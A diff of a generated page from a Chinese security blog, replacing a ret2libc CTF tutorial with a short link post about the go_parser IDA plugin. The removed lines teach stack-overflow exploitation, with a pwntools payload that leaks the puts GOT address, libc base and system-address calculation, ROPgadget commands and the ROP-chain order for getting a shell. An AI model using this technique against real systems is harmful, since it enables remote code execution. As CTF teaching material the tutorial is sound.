@@ -13,24 +13,22 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2023/07/21/pwn/ret2libc/"/>
+    <link rel="canonical" href="http://example.com/2024/01/29/re/分析工具/ida/plugins/go_parser/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="ret2libc基于没有system或没有&#x2F;bin&#x2F;sh($0可以代替,因为在linux环境变量$0就是当前终端)的情况，构造出一条ret调用链来 工具ROPgadget1pip install ROPgadget  ROPgadget可以用于获取需要的字符串，汇编指令，最后可以通过栈溢出跳往对应的汇编指令中 LibcSearcher1pip install LibcSearc">
+        <meta name="description" content="0xjiayu&#x2F;go_parser：IDAPro 的另一个 Golang 二进制解析器 (github.com)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2libc">
-<meta property="og:url" content="http://example.com/2023/07/21/Pwn/ret2libc/index.html">
+<meta property="og:title" content="go_parser">
+<meta property="og:url" content="http://example.com/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/go_parser/index.html">
 <meta property="og:site_name" content="runwu2204">
-<meta property="og:description" content="ret2libc基于没有system或没有&#x2F;bin&#x2F;sh($0可以代替,因为在linux环境变量$0就是当前终端)的情况，构造出一条ret调用链来 工具ROPgadget1pip install ROPgadget  ROPgadget可以用于获取需要的字符串，汇编指令，最后可以通过栈溢出跳往对应的汇编指令中 LibcSearcher1pip install LibcSearc">
+<meta property="og:description" content="0xjiayu&#x2F;go_parser：IDAPro 的另一个 Golang 二进制解析器 (github.com)">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307210035601.png">
-<meta property="article:published_time" content="2023-07-20T16:30:25.000Z">
-<meta property="article:modified_time" content="2023-07-20T17:11:15.000Z">
+<meta property="article:published_time" content="2024-01-29T07:42:02.000Z">
+<meta property="article:modified_time" content="2024-01-29T07:42:09.000Z">
 <meta property="article:author" content="runwu2204">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307210035601.png">
     
     
     <!--- Icon Part-->
@@ -42,7 +40,7 @@
     
     <title>
         
-            ret2libc -
+            go_parser -
         
         Runwu2204
     </title>
@@ -472,11 +470,11 @@
         <div class="label text-third-text-color text-sm">标签</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">41</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">43</div>
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">107</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">113</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -502,7 +500,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">ret2libc</h1>
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">go_parser</h1>
                 </div>
             
             </div>
@@ -523,15 +521,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-07-21 00:30:25</span>
-        <span class="mobile">2023-07-21 00:30:25</span>
+        <span class="desktop">2024-01-29 15:42:02</span>
+        <span class="mobile">2024-01-29 15:42:02</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-21 01:11:15</span>
-            <span class="mobile">2023-07-21 01:11:15</span>
+            <span class="desktop">2024-01-29 15:42:09</span>
+            <span class="mobile">2024-01-29 15:42:09</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -545,7 +543,37 @@
                     
                         
                         <li>
-                            <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                            <a href="/categories/Re/">Re</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/">分析工具</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/">ida</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/">plugins</a>&nbsp;
                         </li>
                     
                     
@@ -574,85 +602,7 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>ret2libc基于没有system或没有&#x2F;bin&#x2F;sh($0可以代替,因为在linux环境变量$0就是当前终端)的情况，构造出一条ret调用链来</p>
-<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ROPgadget</span><br></pre></td></tr></table></figure></div>
-
-<p>ROPgadget可以用于获取需要的字符串，汇编指令，最后可以通过栈溢出跳往对应的汇编指令中</p>
-<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install LibcSearcher</span><br></pre></td></tr></table></figure></div>
-
-<p>该工具可以根据你所给的指令名称对应的指令地址获取对应的外部got表地址</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307210035601.png"
-                      alt="image-20230721003509555"
-                ></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;指令名称&#x27;</span>,指令地址)<span class="comment">#可以获取内部got表对应地址所对应的glibc</span></span><br><span class="line">libc.dump(<span class="string">&quot;需要的指令&quot;</span>)<span class="comment">#可以获取需要指令的外部got表地址</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><table>
-<thead>
-<tr>
-<th align="left">section</th>
-<th align="left">所在 segment</th>
-<th align="left">section 属性</th>
-<th align="left">用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">.plt</td>
-<td align="left">代码段</td>
-<td align="left">RE（可读，可执行）</td>
-<td align="left">.plt section 实际就是通常所说的过程链接表（Procedure Linkage Table, PLT）</td>
-</tr>
-<tr>
-<td align="left">.plt.got</td>
-<td align="left">代码段</td>
-<td align="left">RE</td>
-<td align="left">.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</td>
-</tr>
-<tr>
-<td align="left">.got</td>
-<td align="left">数据段</td>
-<td align="left">RW（可读，可写）</td>
-<td align="left">.got section 中可以用于存放全局变量的地址；.got section 中也可以用于存放不需要延迟绑定的函数的地址。</td>
-</tr>
-<tr>
-<td align="left">.got.plt</td>
-<td align="left">数据段</td>
-<td align="left">RW</td>
-<td align="left">.got.plt section 用于存放需要延迟绑定的函数的地址</td>
-</tr>
-</tbody></table>
-<h4 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h4><p>当puts elfgot表内函数地址时，会puts出真正的表内的函数地址</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取的实际上是got.plt地址</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">inputs=<span class="number">0x40066B</span></span><br><span class="line">pop_rdi_retn=<span class="number">0x400743</span><span class="comment">#ROPgadget --binary babyof --only &#x27;pop|ret&#x27; |grep rdi</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Do&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*o+p64(pop_rdi_retn)+p64(puts_got)+p64(puts_plt)+p64(inputs)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#当收到Do就输出后面的字符串</span></span><br></pre></td></tr></table></figure></div>
-
-<p>pop_rdi_retn 将当前栈顶值(puts_got)传给rdi,然后将栈顶的指针向下移动到(puts_plt),并在之后跳转到栈顶值(puts_plt)</p>
-<p>rdi(puts_got)将作为参数被puts_plt(puts函数)输出</p>
-<p>因此可以泄露出puts的实际got表地址,不是elf中的got.plt</p>
-<h4 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h4><p>详情可见[StormQ’s Blog (csstormq.github.io)](<a class="link"   target="_blank" rel="noopener" href="https://csstormq.github.io/blog/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AF%87%E4%B9%8B%E9%93%BE%E6%8E%A5%EF%BC%8814%EF%BC%89%EF%BC%9A.plt%E3%80%81.plt.got%E3%80%81.got" >https://csstormq.github.io/blog/计算机系统篇之链接（14）：.plt、.plt.got、.got <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 .got.plt section 之间的区别)</p>
-<p>因为system函数地址未知，但我们可以通过外部got表的地址，计算内部got表地址，获取got表内的函数(当加载libc的时候，函数都会在got表内),got表内函数的相对地址不会变</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)<span class="comment">#此处是与泄露的got地址相减，就可以获取got表的基址了</span></span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)<span class="comment">#因为函数相对地址不变,就可以找到内部got表内的system函数地址</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="shell字符串"><a href="#shell字符串" class="headerlink" title="shell字符串"></a>shell字符串</h4><p>题目中可能没有提供字符串，在libc中会含有该字符串，当泄露了got表后可以获得</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system=base+libc.dump(&#x27;system&#x27;)#因为函数相对地址不变,就可以找到内部got表内的system函数地址</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h4><p>x64常用rdi作为传递的第一个参数，所以我们需要一个将shell地址传给rdi的汇编指令(可以将shell字符串的地址存在栈中，通过pop edi调用)，同时又得让命令走向按照我们的意愿来，所以还得有个retn</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line"></span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &quot;二进制文件&quot; --only &#x27;pop|ret&#x27; |grep rdi #可以获取pop rdi retn的地址</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h3><p>system函数需要栈为16字节的倍数，因为此处只用了24字节(传参地址,shell字符串地址,system地址)</p>
-<p>还需要一个地址作为占位,可以选择只有retn指令的地址</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &quot;二进制文件&quot; --only &#x27;ret&#x27; #获取只有retn命令的地址</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><p>需要有个具体的栈的顺序</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(retn地址,传参地址,shell字符串地址,system地址)</span><br></pre></td></tr></table></figure></div>
-
-<p>这样随着逐渐retn就可以获取shell了</p>
+            <p><a class="link"   target="_blank" rel="noopener" href="https://github.com/0xjiayu/go_parser" >0xjiayu&#x2F;go_parser：IDAPro 的另一个 Golang 二进制解析器 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 
         </div>
 
@@ -660,18 +610,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> ret2libc</li>
+        <li><strong>标题:</strong> go_parser</li>
         <li><strong>作者:</strong> runwu2204</li>
         <li><strong>创建于
-                :</strong> 2023-07-21 00:30:25</li>
+                :</strong> 2024-01-29 15:42:02</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2023-07-21 01:11:15
+                    :</strong> 2024-01-29 15:42:09
             </li>
         
         <li>
-            <strong>链接:</strong> https://runwu2204.github.io/2023/07/21/Pwn/ret2libc/
+            <strong>链接:</strong> https://runwu2204.github.io/2024/01/29/Re/分析工具/ida/plugins/go_parser/
         </li>
         <li>
             <strong>
@@ -696,29 +646,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2023/07/22/Misc/%E5%8F%96%E8%AF%81/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">内存取证</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2023/07/21/Pwn/%E9%80%9A%E8%BF%87wsl%E5%AE%9E%E6%97%B6pwn/"
+                        href="/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/qilingida/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">通过wsl实时pwn</span>
+                                <span class="post-nav-title-item">qilingida</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -781,8 +716,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">此页目录</div>
-        <div class="page-title">ret2libc</div>
-        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROPgadget"><span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LibcSearcher"><span class="nav-text">LibcSearcher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="nav-text">栈对齐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP%E9%93%BE"><span class="nav-text">ROP链</span></a></li></ol>
+        <div class="page-title">go_parser</div>
+        
 
     </div>
 </div>
